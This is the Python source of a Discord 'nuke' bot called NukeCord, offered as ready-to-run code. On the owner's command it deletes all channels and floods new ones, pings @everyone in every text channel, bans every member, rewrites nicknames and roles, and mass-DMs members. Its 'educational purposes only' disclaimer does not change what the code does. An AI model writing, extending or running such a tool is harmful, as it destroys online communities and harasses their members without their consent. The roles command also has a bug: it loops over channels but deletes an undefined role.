print("[!] Don't forget to fill out the information in config.json")
input("[!] Make sure that the server member intent is activated")
print("[~] Do nc!duck to get all commands")
import discord 
from discord.ext import commands
import json, os
intents = discord.Intents.default()
intents.members = True
bot = commands.Bot(command_prefix="nc!", intents=intents)
bot.remove_command("help")
f = open("config.json", "r")
x = f.read()
y = json.loads(x)
TOKEN = y["token"]
O = y["your_id"]
ID = int(O)


@bot.event 
async def on_ready():
    print(f"[~] Logged in as {bot.user}")


@bot.command()
async def duck(ctx):
    if ctx.author.id == ID:
        embed = discord.Embed(title="This bot is running NukeCord", description="This is made for educational purposes only! Do never nuke servers of innocent people!\n__**Available commands:**__\n```\nnc!nuke <text> | Nukes current server with text\nnc!spam <text> | Spams all channels including ping\nnc!ban | Bans everyone\nnc!nicknames <text> | Changes everyone's nicknames\nnc!roles <text> | Messes up the roles\nnc!dm <text> | DMs all members\n```", color=0x36393e)
        embed.set_thumbnail(url="https://i.vgy.me/8LslSF.png")
        await ctx.send(embed=embed)




@bot.command()
@commands.guild_only()
async def nuke(ctx, *, arg):
    if ctx.author.id == ID:
        for channel in ctx.guild.channels:
            try:
                await channel.delete()
            except:
                print("\n")
        await ctx.guild.edit(name=arg)
        x = 100
        while x >= 0:
            await ctx.guild.create_text_channel(arg)
            x = int(x) -1
        print(f"[~] Nuked {ctx.guild.name}")

@bot.command()
@commands.guild_only()
async def spam(ctx, *, arg):
    if ctx.author.id == ID:
        for channel in ctx.guild.channels:
            if type(channel) != discord.channel.TextChannel:
                print("\n")
            else:
                await channel.send(f"{arg} @everyone")
            

            
@bot.command()
@commands.guild_only()
async def ban(ctx):
    if ctx.author.id == ID:
        msg = ctx.message
        await msg.add_reaction("🔄")
        for member in ctx.guild.members:
            try:
                await member.ban(reason=None)
            except:
                print("\n")
        await msg.add_reaction("✅")
    else:
        return
    
    
@bot.command()
@commands.guild_only()
async def nicknames(ctx, *, arg):
    if ctx.author.id == ID:
        msg = ctx.message
        await msg.add_reaction("🔄")
        for member in ctx.guild.members:
            try:
                await member.edit(nick=arg)
            except:
                print("\n")
        await msg.add_reaction("✅")
    else:
        return    
            

@bot.command()
@commands.guild_only()
async def roles(ctx, *, arg):
    if ctx.author.id == ID:
        msg = ctx.message
        await msg.add_reaction("🔄")
        for channel in ctx.guild.roles:
            await role.delete()
        x = 30
        guild = ctx.guild
        while x >= 0:
            await guild.create_role(name=arg)
            x = int(x) - 1
        await msg.add_reaction("✅")
        
@bot.command()
@commands.guild_only()
async def dm(ctx, *, arg):
    if ctx.author.id == ID:
        msg = ctx.message
        await msg.add_reaction("🔄")
        for member in ctx.guild.members:
            try:
                await member.send(arg)
            except:
                print(f"[!] Failed to DM {member}")
        await msg.add_reaction("✅")
        

bot.run(TOKEN)
